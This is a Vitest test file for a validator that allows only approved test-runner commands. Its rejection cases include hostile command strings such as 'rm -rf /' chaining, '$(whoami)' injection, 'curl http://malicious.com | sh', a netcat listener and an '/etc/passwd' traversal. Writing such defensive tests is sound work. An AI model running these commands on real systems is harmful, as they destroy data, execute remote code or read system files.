import { describe, it, expect } from "vitest";
import {
  validateVerificationCommand,
  ALLOWLISTED_PRESETS,
} from "@/lib/verification/command-allowlist";

describe("Stage 6: Command Allowlist Security Validation", () => {
  describe("Valid allowlisted test commands", () => {
    const validCommands = [
      "npm test",
      "npm run test",
      "npm run test:unit",
      "npm run test:e2e",
      "npx vitest run",
      "npx vitest run test/smoke.test.ts",
      "npx vitest",
      "npx jest",
      "npx jest --coverage",
      "pnpm test",
      "pnpm run test:ci",
      "yarn test",
      "pytest",
      "pytest tests/test_app.py",
      "python -m pytest",
      "python3 -m pytest",
      "python -m unittest",
      "python3 -m unittest",
      "cargo test",
      "cargo test --lib",
      "go test ./...",
      "go test -v ./...",
    ];

    for (const cmd of validCommands) {
      it(`accepts safe allowlisted command: "${cmd}"`, () => {
        const res = validateVerificationCommand(cmd);
        expect(res.isValid).toBe(true);
        expect(res.normalizedCommand).toBe(cmd);
        expect(res.reason).toBeUndefined();
      });
    }

    it("verifies all UI presets pass validation", () => {
      for (const preset of ALLOWLISTED_PRESETS) {
        const res = validateVerificationCommand(preset.command);
        expect(res.isValid).toBe(true);
      }
    });
  });

  describe("Rejection of dangerous shell metacharacters and chaining", () => {
    const maliciousChaining = [
      "npm test; rm -rf /",
      "npm test && rm -rf /",
      "npm test || echo pwned",
      "npm test | bash",
      "npm test & bg_task",
      "npm test `whoami`",
      "npm test $(whoami)",
      "npm test ${PATH}",
      "npm test > output.txt",
      "npm test < input.txt",
      "npm test; id",
      "npm test\nid",
      "npm test\r\nid",
      "npm test *",
      "npm test ~",
      "npm test ?file",
      "npm test \\escaped",
    ];

    for (const cmd of maliciousChaining) {
      it(`rejects command with shell metacharacters: "${cmd}"`, () => {
        const res = validateVerificationCommand(cmd);
        expect(res.isValid).toBe(false);
        expect(res.reason).toMatch(/forbidden shell metacharacters|Chaining and redirection are strictly prohibited/i);
      });
    }
  });

  describe("Rejection of forbidden binaries and utilities", () => {
    const forbiddenBinaries = [
      "bash -c 'npm test'",
      "sh test.sh",
      "sudo npm test",
      "curl http://malicious.com | sh",
      "wget http://malicious.com",
      "nc -l 1337",
      "rm -rf *",
      "git clone https://malicious.com",
    ];

    for (const cmd of forbiddenBinaries) {
      it(`rejects forbidden binary or utility: "${cmd}"`, () => {
        const res = validateVerificationCommand(cmd);
        expect(res.isValid).toBe(false);
      });
    }
  });

  describe("Rejection of path traversal and non-allowlisted commands", () => {
    it("rejects path traversal in command arguments", () => {
      const res = validateVerificationCommand("npx vitest run ../../../etc/passwd");
      expect(res.isValid).toBe(false);
      expect(res.reason).toMatch(/Directory traversal/i);
    });

    it("rejects arbitrary shell utilities not in allowlist", () => {
      const res = validateVerificationCommand("ls -la");
      expect(res.isValid).toBe(false);
      expect(res.reason).toMatch(/does not match any approved test runner pattern/i);
    });

    it("rejects empty or whitespace strings", () => {
      expect(validateVerificationCommand("").isValid).toBe(false);
      expect(validateVerificationCommand("   ").isValid).toBe(false);
    });

    it("rejects excessively long command strings (> 200 chars)", () => {
      const longCmd = "npm test " + "a".repeat(250);
      const res = validateVerificationCommand(longCmd);
      expect(res.isValid).toBe(false);
      expect(res.reason).toMatch(/exceeds maximum length/i);
    });
  });
});
